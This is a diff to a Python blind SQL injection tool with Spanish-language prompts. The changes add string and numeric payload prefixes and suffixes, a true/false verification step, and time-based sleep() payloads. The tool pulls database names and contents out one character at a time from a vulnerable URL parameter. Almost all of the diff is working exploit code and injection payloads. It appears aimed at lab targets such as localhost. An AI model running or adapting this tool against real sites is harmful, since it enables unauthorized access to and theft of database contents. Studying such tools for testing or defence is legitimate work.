@@ -18,40 +18,77 @@ signal.signal(signal.SIGINT, def_handler)
 
 class BlindSQLi:
 
-    def __init__(self, url, param, method):
+    def __init__(self, url, param, method, injection_type):
         self.url = url
         self.param = param
-        self.method = method  # "conditional" or "time"
+        self.method = method           # "conditional" or "time"
+        self.injection_type = injection_type  # "numeric" or "string"
         self.sleep_time = 0.35
 
     @staticmethod
     def _to_hex(value):
         return "0x" + value.encode().hex()
 
+    def _prefix(self):
+        if self.method == "time":
+            return "1' and " if self.injection_type == "string" else "1 and "
+        else:
+            return "-1' or " if self.injection_type == "string" else "9 or "
+
+    def _suffix(self):
+        return "-- -" if self.injection_type == "string" else ""
+
     def _check(self, injection):
         target = f"{self.url}?{self.param}={injection}"
 
         if self.method == "time":
             start = time.time()
-            r = requests.get(target)
+            requests.get(target)
             elapsed = time.time() - start
             return elapsed > self.sleep_time
         else:
             r = requests.get(target)
             return r.status_code == 200
 
-    def _build_injection(self, query, position, char_code):
+    def verify(self):
+        log.info("Verificando que la inyeccion funciona...")
+        prefix = self._prefix()
+        suffix = self._suffix()
+
         if self.method == "time":
-            return f"1 and if(ascii(substr(({query}),{position},1))={char_code},sleep({self.sleep_time}),1)"
+            true_inj = f"{prefix}if(1=1,sleep({self.sleep_time}),1){suffix}"
+            false_inj = f"{prefix}if(1=2,sleep({self.sleep_time}),1){suffix}"
         else:
-            return f"9 or ascii(substring(({query}),{position},1))={char_code}"
+            true_inj = f"{prefix}1=1{suffix}"
+            false_inj = f"{prefix}1=2{suffix}"
+
+        true_result = self._check(true_inj)
+        false_result = self._check(false_inj)
+
+        if true_result and not false_result:
+            log.success("Inyeccion verificada correctamente (TRUE=diferente de FALSE)")
+            return True
+        else:
+            log.failure(f"La inyeccion no funciona con este tipo/metodo (TRUE={true_result}, FALSE={false_result})")
+            log.info("Prueba con otro tipo (numerica/string) o metodo (conditional/time)")
+            return False
+
+    def _build_injection(self, query, position, char_code):
+        prefix = self._prefix()
+        suffix = self._suffix()
+        if self.method == "time":
+            return f"{prefix}if(ascii(substr(({query}),{position},1))={char_code},sleep({self.sleep_time}),1){suffix}"
+        else:
+            return f"{prefix}ascii(substring(({query}),{position},1))={char_code}{suffix}"
 
     def _extract_length(self, query):
+        prefix = self._prefix()
+        suffix = self._suffix()
         for length in range(1, 200):
             if self.method == "time":
-                injection = f"1 and if(length(({query}))={length},sleep({self.sleep_time}),1)"
+                injection = f"{prefix}if(length(({query}))={length},sleep({self.sleep_time}),1){suffix}"
             else:
-                injection = f"9 or length(({query}))={length}"
+                injection = f"{prefix}length(({query}))={length}{suffix}"
 
             if self._check(injection):
                 return length
@@ -68,7 +105,7 @@ class BlindSQLi:
 
         for position in range(1, 500):
             found = False
-            for char_code in range(32, 127):
+            for char_code in range(33, 127):
                 injection = self._build_injection(query, position, char_code)
                 p1.status(f"Pos {position} | Char {char_code} ({chr(char_code)})")
 
@@ -190,7 +227,12 @@ def main():
         url = input("\033[1;36m[?] URL objetivo (ej: http://localhost/searchUsers.php): \033[0m").strip()
         param = input("\033[1;36m[?] Parametro vulnerable (ej: id): \033[0m").strip()
 
-        print("\n\033[1;33m[*] Metodo de inyeccion:\033[0m")
+        print("\n\033[1;33m[*] Tipo de inyeccion:\033[0m")
+        print("  \033[1;33m[1]\033[0m Numerica  (?id=9 or ...)")
+        print("  \033[1;33m[2]\033[0m String    (?id=' ...-- -)")
+        type_choice = input("\n\033[1;36m[?] Selecciona tipo (1/2): \033[0m").strip()
+
+        print("\n\033[1;33m[*] Metodo de deteccion:\033[0m")
         print("  \033[1;33m[1]\033[0m Conditional (Status Code)")
         print("  \033[1;33m[2]\033[0m Time-Based (Sleep)")
         method_choice = input("\n\033[1;36m[?] Selecciona metodo (1/2): \033[0m").strip()
@@ -198,13 +240,18 @@ def main():
         print("\n\n[!] Saliendo...\n")
         sys.exit(1)
 
+    injection_type = "numeric" if type_choice == "1" else "string"
     method = "conditional" if method_choice == "1" else "time"
 
     print(f"\n\033[1;32m[+] URL:       {url}")
     print(f"[+] Parametro: {param}")
+    print(f"[+] Tipo:      {injection_type}")
     print(f"[+] Metodo:    {method}\033[0m\n")
 
-    sqli = BlindSQLi(url, param, method)
+    sqli = BlindSQLi(url, param, method, injection_type)
+
+    if not sqli.verify():
+        sys.exit(1)
 
     # --- Fase 1: Bases de datos ---
     databases = sqli.get_databases()
